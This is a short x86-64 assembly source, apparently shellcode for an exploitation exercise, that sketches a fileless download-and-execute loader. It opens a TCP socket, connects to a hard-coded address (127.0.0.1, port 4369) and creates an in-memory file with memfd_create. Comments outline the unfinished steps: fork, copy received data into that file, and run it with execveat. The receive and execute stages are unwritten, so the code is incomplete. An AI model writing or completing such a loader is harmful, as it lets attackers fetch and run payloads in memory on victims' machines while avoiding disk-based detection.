.intel_syntax noprefix
.global _start
_start:

#unlink
#fork

#recv -> write (loop)

#execveat ("", NULL, NULL, 0x1000)

# r12 = socket_fd r13 = f_fd
mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall
mov r12, rax

mov rax, 42
mov rdi, r12
lea rsi, [rip + addr]
mov rdx, 16
syscall

mov rax, 319
lea rdi, [rip + f]
mov rsi, 1
syscall
mov r13, rax












addr:

.quad 0x0100007f11110002


f:

.asciz "y"
